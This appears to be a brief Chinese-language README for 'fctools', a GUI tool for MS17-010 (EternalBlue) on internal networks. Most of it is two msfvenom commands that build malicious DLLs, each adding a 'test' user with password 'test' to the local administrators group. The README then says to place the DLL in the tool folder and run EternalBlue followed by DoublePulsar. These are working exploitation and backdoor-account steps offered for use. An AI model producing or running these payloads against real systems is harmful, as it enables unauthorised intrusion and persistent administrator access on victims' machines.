
## name
fctools
## purpose
内网ms17010基于GUI的测试检测工具
## how to use
使用msf命令生成恶意dll


```JavaScript
msfvenom -p windows/exec CMD="cmd.exe /c net user test test /add&net localgroup administrators test /add" EXITFUNC=process -f dll > /root/x32.dll

msfvenom -p windows/x64/exec CMD="cmd.exe /c net user test test /add&net localgroup administrators test /add" EXITFUNC=process -f dll > /root/x64.dll
```

然后将dll放入工具主目录下即可，先进行永恒之蓝的利用，再进行双子星的利用
